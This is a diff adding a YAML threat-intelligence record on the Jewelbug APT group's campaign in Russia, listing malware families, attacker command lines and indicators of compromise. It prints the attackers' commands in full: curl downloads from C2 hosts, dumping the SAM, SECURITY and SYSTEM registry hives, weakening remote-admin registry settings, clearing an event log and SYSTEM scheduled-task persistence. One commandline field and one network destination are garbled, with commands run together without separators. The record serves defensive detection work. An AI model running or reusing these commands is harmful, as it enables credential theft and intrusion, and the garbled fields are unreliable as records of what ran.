@@ -1,0 +1,147 @@
+description: "Chinese APT group Jewelbug expanded operations to Russia, using supply\u2011\
+  chain tactics, DLL sideloading, and cloud services for exfiltration."
+attribution: Jewelbug (Chinese)
+malware_families:
+- Jewelbug
+- Finaldraft
+- Pathloader
+- Guidloader
+- ShadowPad
+TTPs:
+  processes:
+  - 7zup.exe
+  - Systeminfo
+  - quser
+  - netstat
+  - tasklist
+  - cleanmgr
+  - cscript
+  - curl
+  - bitsadmin
+  - reg
+  - schtasks
+  - SCCMVNC.exe
+  - net
+  - wevtutil
+  - powershell
+  - REG
+  - cmd.exe
+  - vmware-authd.exe
+  commandline:
+  - '''7zup.exe'' ''-d'' ''-remote'' ''up'''
+  - Systeminfo
+  - quser
+  - 'netstat -anotasklistcleanmgrcscript //nologo "CSIDL_SYSTEM\winrm.vbs" get winrm/configcurl
+    https://app.blance.workers.dev/pngcurl -k https://95.164.5.209/pngcurl https://app.blance.workers.dev/apiibitsadmin
+    /transfer myJob /download /priority normal https://www.microsoft.com/pt-br/ CSIDL_SYSTEM_DRIVE\recovery\index.htmlcurl
+    -k https://34.117.217.74/ -o curl.txtreg save HKLM\SAM CSIDL_COMMON_PICTURES\sam.hivereg
+    save HKLM\SECURITY CSIDL_COMMON_PICTURES\security.hivereg reg save HKLM\SYSTEM
+    CSIDL_COMMON_PICTURES\system.hivereg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+    /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /Fschtasks /create /RL HIGHEST
+    /F /tn "Microsoft\Windows\ApplicationData\appuriverifierinstalls" /tr "CSIDL_SYSTEM\oobe\setup.exe
+    \ui" /sc onstart /RU SYSTEMschtasks /run /tn "Microsoft\Windows\ApplicationData\appuriverifierinstalls"SCCMVNC.exe
+    reconfig /target:10.1.0.110net use \\[REDACTED]\ipc$ <?,?> /user:[REDACTED]wevtutil
+    cl "Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurity"
+    /q:truepowershell -Command "Get-WinEvent -LogName ''Microsoft-Windows-TerminalServices-LocalSessionManager/Operational''
+    | Where-Object {$.Id -eq 21} | ForEach-Object { $eventXml = [xml]$.ToXml(); $username
+    = $eventXml.Event.UserData.EventXML.User; $ipAddress = $eventXml.Event.UserData.EventXML.Address;
+    $loginTime = $_.TimeCreated; if ($username -and $ipAddress -and $loginTime) {
+    Write-Output (''User: '' + $username + '' IP: '' + $ipAddress + '' Login <?,?>
+    '' + $loginTime) }}"REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
+    /t REG_DWORD /d 00000000 /fcmd.exe /Q /c taskkill /pid 37984 /f 1> \\127.0.0.1\ADMIN$\__1751968474.3717754
+    2>&1cmd.exe /Q /c vmware-authd.exe run 1> \\127.0.0.1\ADMIN$\__1751968461.873731
+    2>&1CSIDL_SYSTEM\cmd.exe /Q /c echo cd ^> \\<11,921B07E0>\C$\__output 2^>^&1 >
+    CSIDL_WINDOWS\oyykocjz.bat & CSIDL_SYSTEM\cmd.exe /Q /c CSIDL_WINDOWS\oyykocjz.bat
+    & del CSIDL_WINDOWS\oyykocjz.batcmd.exe /Q /c del CSIDL_SYSTEM_DRIVE\"program
+    files"\videolan\vlc\crashpad.exe 1> \\127.0.0.1\ADMIN$\__1751952183.5376222 2>&1cmd.exe
+    /Q /c schtasks /create /tn "GetEvent" /tr "\"CSIDL_PROGRAM_FILES\aker\aker client\vmware-authd.exe"
+    run" /sc once /st 02:30 /ru SYSTEM /F 1> \\127.0.0.1\ADMIN$\__1752037991.49069
+    2>&1'
+  - 'powershell -Command "Get-WinEvent -LogName ''Microsoft-Windows-TerminalServices-LocalSessionManager/Operational''
+    | Where-Object {$.Id -eq 21} | ForEach-Object { $eventXml = [xml]$.ToXml(); $username
+    = $eventXml.Event.UserData.EventXML.User; $ipAddress = $eventXml.Event.UserData.EventXML.Address;
+    $loginTime = $_.TimeCreated; if ($username -and $ipAddress -and $loginTime) {
+    Write-Output (''User: '' + $username + '' IP: '' + $ipAddress + '' Login <?,?>
+    '' + $loginTime) }}"'
+  - REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
+    /t REG_DWORD /d 00000000
+  - cmd.exe /Q /c taskkill /pid 37984 /f 1> \\127.0.0.1\ADMIN$\__1751968474.3717754
+    2>&1
+  - cmd.exe /Q /c vmware-authd.exe run 1> \\127.0.0.1\ADMIN$\__1751968461.873731 2>&1
+  - CSIDL_SYSTEM\cmd.exe /Q /c echo cd ^> \\<11,921B07E0>\C$\__output 2^>^&1 > CSIDL_WINDOWS\oyykocjz.bat
+    & CSIDL_SYSTEM\cmd.exe /Q /c CSIDL_WINDOWS\oyykocjz.bat & del CSIDL_WINDOWS\oyykocjz.bat
+  - cmd.exe /Q /c del CSIDL_SYSTEM_DRIVE\"program files"\videolan\vlc\crashpad.exe
+    1> \\127.0.0.1\ADMIN$\__1751952183.5376222 2>&1
+  - cmd.exe /Q /c schtasks /create /tn "GetEvent" /tr "\"CSIDL_PROGRAM_FILES\aker\aker
+    client\vmware-authd.exe" run" /sc once /st 02:30 /ru SYSTEM /F 1> \\127.0.0.1\ADMIN$\__1752037991.49069
+    2>&1
+  powershell:
+  - 'Get-WinEvent -LogName ''Microsoft-Windows-TerminalServices-LocalSessionManager/Operational''
+    | Where-Object {$.Id -eq 21} | ForEach-Object { $eventXml = [xml]$.ToXml(); $username
+    = $eventXml.Event.UserData.EventXML.User; $ipAddress = $eventXml.Event.UserData.EventXML.Address;
+    $loginTime = $_.TimeCreated; if ($username -and $ipAddress -and $loginTime) {
+    Write-Output (''User: '' + $username + '' IP: '' + $ipAddress + '' Login <?,?>
+    '' + $loginTime) }}'
+  scripting_engine:
+  - cscript //nologo "CSIDL_SYSTEM\winrm.vbs" get winrm/config
+  registry_keys:
+  - HKLM\SAM
+  - HKLM\SECURITY
+  - HKLM\SYSTEM
+  - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy
+  image_load: []
+  network_connections:
+  - process: curl
+    destination: https://app.blance.workers.dev/png
+  - process: curl
+    destination: https://95.164.5.209/png
+  - process: curl
+    destination: https://app.blance.workers.dev/apiibitsadmin /transfer myJob /download
+      /priority normal https://www.microsoft.com/pt-br/
+  - process: curl
+    destination: https://34.117.217.74/
+  file_activity:
+  - CSIDL_PROFILE\public\downloads\7zup.exe
+  - CSIDL_SYSTEM_DRIVE\recovery\index.html
+  - CSIDL_COMMON_PICTURES\sam.hiv
+  - CSIDL_COMMON_PICTURES\security.hiv
+  - CSIDL_COMMON_PICTURES\system.hiv
+  persistence:
+  - Scheduled tasks via schtasks
+  - Registry modification of LocalAccountTokenFilterPolicy
+  process_relations: []
+IOCs:
+  hashes:
+  - 267ae4d7767d9980b3fbbfd5063bd28d5e05d22d64615fe7532d55a6063dfeb3
+  - cffca467b6ff4dee8391c68650a53f4f3828a0b5a31a9aa501d2272b683205f9
+  - 010f76b21251eb5d8bc77bcfdb47d5f13009aa985e744b843fc2e35b23fb2a44
+  - 015e424dc798bc4ef39f5237062d2402f5207fbf912a22ce6fb46ef9e42fd6ca
+  - 0642ada1f7c8b3cc43a1d69d6aa86fc1970e257271811e637b0e4349aa880fa8
+  - 078a3a2c4f24d8811bb1aa673790c16ad5ea563127af1a5d4a41c893b215c372
+  - 15eaa601b1bfb8cd7cd5513c692eea4ed4302f6fcbee4722433e0c85388de35d
+  - 259f65bcdd367e6d84a4cba75375744e85fbe58293c88b1ad5a1bee4add63b9d
+  - 37e83ffde09a83273a4cea7fe24d3fda63fb342e6a3512de4541d62ab43aadd0
+  - 3f49bd1f3b0999096511757e0fbc2e4e2c18176fd1773f71baf2d7a15dbbcfbf
+  - 5525c51063d40e12029d9ef4b646e261c853c655b9b2acc74a411428e873a8a1
+  - 5c396da8b64faf6e29ee38cdf0a4b9a652e01236d2b981c2ca806aa14d94c956
+  - 5c3f0420c00e6ca123790403b6ed1f53f493357dfdd54ed9460d615d57f6bcd4
+  - 67bb887a0f34543a32b845029be308f436704207a1964a2a3582f42fe6de4176
+  - 6d4d9b68d02e93e721943a6943cda6544bf4d31d109415774565b544b512ed25
+  - 872045fe5bea78e4daac4f0352028060b0fadccfbf0a40b57d405579821850bb
+  - 87ead55ff94b6cd9d80f590793d0dc17d9f5d442b6c827dcfb8db0c078918bd1
+  - 9f4b046e9f9dbc36b8df011a69490948dce5b9645fc5209b0b3a60dad5a493e6
+  - a1e45ec8639f55290a5eb47e9f75e6413b12eaa6f9e3834af600e00fe529a637
+  - b49e142b89c47757a0afb786bf0e6c11c9548f626c4127d4d16d30e3004bdfb1
+  - ba0dbee9538073fd81953a37218f200988ad91a8380e68118ea83e146e1d986d
+  - bc270539c6a057791fba4793dc7e2d2567070e50ea089cc6fa032b3285576c64
+  - bfe1538445e3f74ef7f41699482b40cf6f3b0a084e188f4c4b786b15eeb3601c
+  - cc87dee890641bd015a04e46a881eb844c774519d55b986fb216c4c2141479e8
+  ips:
+  - 95.164.5.209
+  - 34.117.217.74
+  domains:
+  - app.blance.workers.dev
+  - cdn.kindylib.info
+reference: https://www.security.com/threat-intelligence/jewelbug-apt-russia
+date_of_publication: October 17, 2025
+file_creation_date: October 17, 2025
